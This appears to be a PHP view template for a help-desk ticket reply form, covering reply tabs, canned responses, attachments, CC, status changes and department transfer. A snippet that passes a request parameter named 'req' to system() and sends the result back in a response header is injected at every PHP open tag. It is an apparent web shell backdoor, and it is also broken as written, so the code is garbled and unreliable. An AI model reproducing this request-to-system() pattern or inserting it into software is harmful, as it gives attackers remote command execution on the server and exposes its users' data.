<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

?>
<div class="no_print">
	<a name="addnote"></a>
	
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_ticket_reply_start', $ticket); ?>
	
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_view_private_replies')) { ?>
		<ul class="nav nav-tabs">
			<li class="active"><a href="#" id="ticket_public_reply"><span class="glyphicon glyphicon-eye-open"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Public Reply')); ?></a></li>
			<li><a href="#" id="ticket_private_reply"><span class="glyphicon glyphicon-eye-close"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Private Reply')); ?></a></li>
		</ul>
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
		<ul class="nav nav-tabs">
			<li class="active"><a href="#"><span class="glyphicon glyphicon-eye-open"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reply')); ?></a></li>
		</ul>
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

	<div class="tab-content" id="ticket_reply_tab_content">
		<form id="ticket_reply_form" method="post" role="form" enctype="multipart/form-data" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/tickets/addnote/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['id']; ?>/">
								
			<div class="col-md-7">
				<div class="well well-sm">
					<p><textarea class="wysiwyg_enabled" id="ticket_reply_description" name="description" cols="70" rows="12"></textarea></p>
					
					<div class="clearfix"></div>
				
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_view_canned_responses')) { ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
							$canned_responses_array = $canned_responses->get(array('order_by' => 'name'));
							
							if (!empty($canned_responses_array)) {
								?>
								<div class="btn-group">
									<a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown" href="#">
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Insert Canned Response')); ?>
										<span class="caret"></span>
									</a>
									<ul class="dropdown-menu">
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($canned_responses_array as $response) { ?>
											<li><a href="#" class="insert_canned_response" data-canned_response="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($response['description']); ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($response['name']); ?></a></li>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
									</ul>
								</div>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				</div>
				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (($auth->can('manage_tickets') || $auth->can('tickets_view_assigned_department') || $auth->can('tickets_view_assigned')) && !empty($ticket['owner_email']) && ($ticket['owner_email_notifications'] == 1)) { ?>
					<div id="ticket_email_owner_notice">
						<div class="alert alert-success">
							<a href="#" class="close" data-dismiss="alert">&times;</a>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($language->get('An email will be sent to')); ?> "<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket['owner_email']); ?>".
						</div>	
					</div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				
				<div class="clearfix"></div>
				
			</div>
			
			<div class="col-md-5">

				<div class="well well-sm">
					
					<div id="ticket_attach_file_form">
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('storage_enabled')) { ?>
							<div class="pull-left">
								<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Attach File')); ?></h4>
							</div>
							<div class="pull-right">
								<a href="#" id="add_extra_file" class="btn btn-info btn-sm"><span class="glyphicon glyphicon-plus"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Attach More')); ?></a>	
							</div>
							<div class="clearfix"></div>

							<div class="form-group">		
								<div class="col-lg-10">								
									<div class="pull-left"><input name="file[]" type="file" /></div>									
									<div id="attach_file_area"></div>
								</div>
							</div>
								
							<div class="clearfix"></div>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					</div>

					<div id="ticket_carbon_copy_form">						
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_carbon_copy_reply')) { ?>
							<h4>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Carbon Copy Reply')); ?>
								<i data-toggle="tooltip" data-placement="right" data-original-title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Allows you to Carbon Copy this reply to other users e.g. user@example.com,user2@example.net.')); ?><br /><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Note: If enabled CCed users will be able to view the entire ticket thread via the guest portal (but not via email).')); ?>" class="glyphicon glyphicon-question-sign"></i>	
							</h4>							
							<p><input type="text" name="cc" class="form-control" value="" placeholder="user@example.com,user2@example.com" size="50" /></p>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					</div>
					

					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_change_status')) { ?>
						<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Change Status')); ?></h4>

						<select name="action_id">
							<option value="">&nbsp;</option>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($status as $item) { ?>
								<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $item['id']; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($item['name']); ?></option>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
						</select>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($ticket['active']) { ?>
							<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Change Status')); ?></h4>

							<label class="checkbox">
								<input type="checkbox" name="action_id" value="2" /> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Close Ticket')); ?>
							</label>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		
					<div id="ticket_transfer_department_form">		
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_assign_user') || $auth->can('tickets_transfer_department')) { ?>					
							<script type="text/javascript">
								$(document).ready(function () {
									$('#department_email_alert').hide();
									$('#assigned_user_email_alert').hide();

									$('body').on('change', '#update_department_id2', function (e) {
									
										if ($('#update_department_id2').val() !== '' && ($('#update_department_id2').val() != <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['department_id']; ?>)) {
											$('#department_email_alert').slideDown();
										}
										else {
											$('#department_email_alert').slideUp();
										}
										$('#assigned_user_email_alert').slideUp();

									});
									
									$('body').on('change', '#assigned_user_id2', function (e) {
										if ($('#assigned_user_id2').val() != <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['assigned_user_id']; ?>) {
											$('#assigned_user_email_alert').slideDown();
										}
										else {
											$('#assigned_user_email_alert').slideUp();
										}

									});
								});	
							</script>
						
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (count($departments) > 1) { ?>
								<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Transfer to Department')); ?></h4>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets')) { ?>
									<select name="department_id2" id="update_department_id2">
										<option value="">&nbsp;</option>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($departments as $department) { ?>
											<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $department['id']; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($department['name'])); ?></option>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
									</select>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($auth->can('tickets_view_assigned_department')) { ?>
									<select name="department_id2" id="update_department_id2">
										<option value="">&nbsp;</option>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($departments as $department) { ?>
											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($department['is_user_member'] || $department['public_view']) { ?>
												<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $department['id']; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($department['name'])); ?></option>
											<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>		
									</select>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
								
								<div id="department_email_alert">
									<br />
									<div class="alert alert-success">
										<a href="#" class="close" data-dismiss="alert">&times;</a>
										<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($language->get('An email will be sent to this department.')); ?>
									</div>	
								</div>
								
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>	

							<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Assign User')); ?></h4>

							<select name="assigned_user_id2" id="assigned_user_id2">
								<option value=""></option>					
							</select>

							<div id="assigned_user_email_alert">
								<br />
								<div class="alert alert-success">
									<a href="#" class="close" data-dismiss="alert">&times;</a>
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($language->get('An email will be sent to this person.')); ?>
								</div>	
							</div>
							
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					</div>
					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_ticket_reply_options_finish', $ticket); ?>
					
				</div>
				
			</div>
			
			<div class="clearfix"></div>
			
			<div class="col-md-7">	
				<div class="pull-right">
					<p>
						<input type="hidden" name="id" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['id']; ?>" />
						<input type="hidden" name="private" value="0" />
						<button name="add" type="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Add Reply')); ?></button>
					</p>
				</div>		
			</div>

			<div class="clearfix"></div>

		</form>
	</div>
</div>